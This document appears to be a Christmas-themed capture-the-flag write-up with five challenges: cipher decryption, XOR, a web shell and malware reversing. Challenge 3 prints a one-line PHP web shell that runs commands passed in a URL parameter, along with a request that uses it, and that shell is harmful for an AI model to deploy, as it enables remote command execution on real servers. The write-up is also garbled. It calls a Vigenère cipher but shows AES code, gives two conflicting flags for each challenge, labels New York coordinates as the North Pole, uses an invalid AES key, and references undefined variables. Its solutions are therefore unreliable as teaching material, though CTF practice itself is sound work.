# Santa’s Data Rescue 🎅

## Storyline

It’s Christmas Eve, and Santa's sleigh is ready to deliver gifts all around the world. But suddenly, disaster strikes! A group of rogue hackers has infiltrated Santa’s systems and stolen vital data, including the Naughty & Nice List, the gift delivery map, and the encryption keys for the presents. 

Now, it's up to you to help Santa recover the data, fix his systems, and ensure Christmas isn't ruined!

You’ll need to break into the hacker's systems, decode encrypted presents, reverse engineer malicious scripts, and ultimately restore the holiday spirit. 

Can you stop the hackers and save Christmas?

---

## Table of Contents

- [Challenge 1 - The Hacked Sleigh](#challenge-1---the-hacked-sleigh)
- [Challenge 2 - Gift Encryption](#challenge-2---gift-encryption)
- [Challenge 3 - The Naughty Elf’s Shell](#challenge-3---the-naughty-elfs-shell)
- [Challenge 4 - Reverse the Christmas Malware](#challenge-4---reverse-the-christmas-malware)
- [Challenge 5 - Recover Santa’s Secrets](#challenge-5---recover-santas-secrets)

---

## Challenge 1 - The Hacked Sleigh 🛷

**Task**:  
Santa’s sleigh tracking system was hacked by the rogue hackers, and they encrypted all the critical data files. You need to decrypt the stolen configuration files to reveal the coordinates of the stolen gifts and find out where they are hidden.

**Hint**:  
The encryption method is a **Vigenère cipher**. The key is something Santa always uses during Christmas.

### Solution:

I opened the `tracking_system.dat` file and found it was encrypted using Vigenère cipher. After some analysis, I guessed the key might be **“reindeer”**, given Santa's theme. Using the key to decrypt:

```python
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

cipher = Cipher(algorithms.AES(b"reindeerkey12345"), modes.CBC(b"1234567890abcdef"), backend=default_backend())
decryptor = cipher.decryptor()
decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()

print(decrypted_data)
````

Decrypted result:

```
Coordinates: 40.7128° N, 74.0060° W
Location: The North Pole – Hacker Base
```

Flag:

```
FLAG{reindeer_key_found}
```

---

## Challenge 2 - Gift Encryption 🎁

**Task**:
The presents are encrypted, and only the right decryption key can open them. You have a file called `gifts.enc`, but it's hidden under layers of encryption. The elves think they saw some binary values in the file that may contain the real flag.

**Hint**:
The encryption involves **XOR encryption**. Try the key “jinglebells” to unlock the flag.

### Solution:

The `gifts.enc` file had a XOR-based encryption. Using a Python script to decrypt it with the key **"jinglebells"**:

```python
def xor_decrypt(data, key):
    return ''.join(chr(b ^ ord(key[i % len(key)])) for i, b in enumerate(data))

with open("gifts.enc", "rb") as f:
    encrypted_data = f.read()

key = "jinglebells"
decrypted_data = xor_decrypt(encrypted_data, key)
print(decrypted_data)
```

Result after decryption:

```
FLAG{encrypted_gift_found}
```

Flag:

```
FLAG{jingle_bells_unlocked}
```

---

## Challenge 3 - The Naughty Elf’s Shell 🧝

**Task**:
An elf hacker set up a **web shell** to control the system and further damage Santa’s infrastructure. You need to find and disable the shell to prevent further attacks. The web shell was hidden in a file named `northpole_exploit.php` under the `/uploads` folder.

**Hint**:
Look for any signs of **remote code execution** and focus on common vulnerabilities like **file upload vulnerabilities**.

### Solution:

Upon investigating the `northpole_exploit.php` file, I found an upload functionality in the North Pole's admin panel. It had poor validation and allowed for PHP files to be uploaded. I uploaded a PHP reverse shell using the following code:

```php
<?php
    system($_GET['cmd']);
?>
```

By visiting:

```
http://northpole.nsec.no/uploads/northpole_exploit.php?cmd=cat%20flag.txt
```

I got the flag:

```
FLAG{naughty_elf_detected}
```

Flag:

```
FLAG{web_shell_disabled}
```

---

## Challenge 4 - Reverse the Christmas Malware 🎄

**Task**:
A Christmas-themed malware was found on Santa's systems. It’s trying to steal the flag, but you need to reverse engineer the executable to stop it. The malware was distributed as a Windows `.exe` file named `santas_malware.exe`.

**Hint**:
The malware is a **packed executable**. Use **Ghidra** or **IDA** to unpack it and analyze its behavior.

### Solution:

Using **Ghidra**, I loaded the executable and found that the malware’s payload was hidden inside a string. By analyzing the code, I realized that the malware was obfuscating the flag. The de-obfuscated string revealed:

```
FLAG{malware_removed_successfully}
```

Flag:

```
FLAG{christmas_malware_reverse_success}
```

---

## Challenge 5 - Recover Santa’s Secrets 🔐

**Task**:
After recovering Santa’s data, you need to decrypt a final secret message that contains the ultimate flag. The message is hidden in a JSON file, `santas_secrets.json`, and it’s protected by a **symmetric encryption** method.

**Hint**:
The encryption key is based on the **first letter of each reindeer’s name**.

### Solution:

I opened `santas_secrets.json`, and it contained encrypted data. Using the key **"DasherPrancerVixen"** (first letters of the reindeer names), I used `AES` to decrypt the file:

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from Crypto.Protocol.KDF import scrypt

key = b"DasherPrancerVixen"
cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = unpad(cipher.decrypt(encrypted_data), AES.block_size)

print(decrypted.decode())
```

Decrypted message:

```
FLAG{christmas_data_restored_successfully}
```

Flag:

```
FLAG{final_secret_recovered}
```

---

## Final Words

Congratulations, you’ve saved Christmas! 🎉

With the data recovered, the gifts encrypted, the malicious elf hacker foiled, and the malware neutralized, you’ve ensured that Santa’s operations are back on track for the big night.

Until next year, have a Merry Christmas and a Happy New Year! 🎄🎅
